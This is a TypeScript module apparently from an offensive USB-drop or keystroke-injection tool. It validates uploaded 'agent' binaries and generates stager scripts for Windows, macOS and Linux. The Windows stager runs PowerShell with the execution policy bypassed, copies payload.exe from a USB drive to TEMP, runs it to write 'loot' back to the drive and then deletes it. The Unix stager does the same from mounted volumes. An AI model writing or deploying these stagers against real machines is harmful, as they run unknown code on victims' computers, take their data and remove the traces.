import type { TargetOs } from './types';

const USB_WINDOWS_AGENT = 'payload.exe';
const USB_UNIX_AGENT = 'payload.bin';
const ALLOWED_BINARY_EXTENSIONS = new Set(['appimage', 'bin', 'elf', 'exe']);
const BLOCKED_FILE_TYPES = new Set([
  'application/gzip',
  'application/json',
  'application/pdf',
  'application/zip',
  'application/x-7z-compressed',
  'application/x-gzip',
  'application/x-tar',
  'application/x-zip-compressed',
]);
const BINARY_MAGIC_PREFIXES = [
  [0x4d, 0x5a],
  [0x7f, 0x45, 0x4c, 0x46],
  [0xfe, 0xed, 0xfa, 0xce],
  [0xce, 0xfa, 0xed, 0xfe],
  [0xfe, 0xed, 0xfa, 0xcf],
  [0xcf, 0xfa, 0xed, 0xfe],
  [0xca, 0xfe, 0xba, 0xbe],
  [0xbe, 0xba, 0xfe, 0xca],
  [0xca, 0xfe, 0xba, 0xbf],
  [0xbf, 0xba, 0xfe, 0xca],
];

export function formatBytes(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function fileExtension(name: string): string {
  const trimmed = (name || '').trim();
  const dot = trimmed.lastIndexOf('.');
  if (dot <= 0 || dot === trimmed.length - 1) return '';
  return trimmed.slice(dot + 1).toLowerCase();
}

function looksLikeExecutableBinary(bytes: Uint8Array): boolean {
  return BINARY_MAGIC_PREFIXES.some((prefix) =>
    prefix.every((value, index) => bytes[index] === value),
  );
}

export async function validateArmoryFile(file: File | null): Promise<string> {
  if (!file || !file.size) {
    return 'Choose a compiled EXE, ELF, or Mach-O binary.';
  }

  const extension = fileExtension(file.name);
  if (extension && !ALLOWED_BINARY_EXTENSIONS.has(extension)) {
    return 'Upload a compiled EXE, ELF, or Mach-O binary.';
  }

  if (
    file.type.startsWith('image/') ||
    file.type.startsWith('text/') ||
    BLOCKED_FILE_TYPES.has(file.type)
  ) {
    return 'Images, text files, and archives are not valid agent binaries.';
  }

  try {
    const bytes = new Uint8Array(await file.slice(0, 8).arrayBuffer());
    if (!looksLikeExecutableBinary(bytes)) {
      return 'Only executable EXE, ELF, or Mach-O binaries can be uploaded.';
    }
  } catch {
    return 'Unable to inspect the selected file.';
  }

  return '';
}

export function stagerPreview(os: TargetOs): string {
  if (os === 'windows') {
    return [
      'powershell -NoProfile -ExecutionPolicy Bypass',
      '$r = ""',
      'foreach ($drive in Get-PSDrive -PSProvider FileSystem) {',
      `  $candidate = Join-Path $drive.Root '${USB_WINDOWS_AGENT}'`,
      '  if (Test-Path $candidate) { $r = $drive.Root; break }',
      '}',
      'if ($r) {',
      `  $s = Join-Path $r '${USB_WINDOWS_AGENT}'`,
      "  $loot = Join-Path $r 'loot-usb.json'",
      "  $d = Join-Path $env:TEMP 'pico_agent.exe'",
      '  Copy-Item $s $d -Force',
      '  & $d --loot-out $loot',
      '  Remove-Item $d -Force -ErrorAction SilentlyContinue',
      '}',
    ].join('\n');
  }

  const roots = os === 'macos' ? '/Volumes/*' : '/media/$USER/* /run/media/$USER/* /mnt/*';
  return [
    `for d in ${roots}; do`,
    `  if [ -f "$d/${USB_UNIX_AGENT}" ]; then`,
    `    cp "$d/${USB_UNIX_AGENT}" /tmp/pico_agent`,
    '    chmod +x /tmp/pico_agent',
    '    /tmp/pico_agent --loot-out "$d/loot-usb.json"',
    '    rm -f /tmp/pico_agent',
    '    break',
    '  fi',
    'done',
  ].join('\n');
}
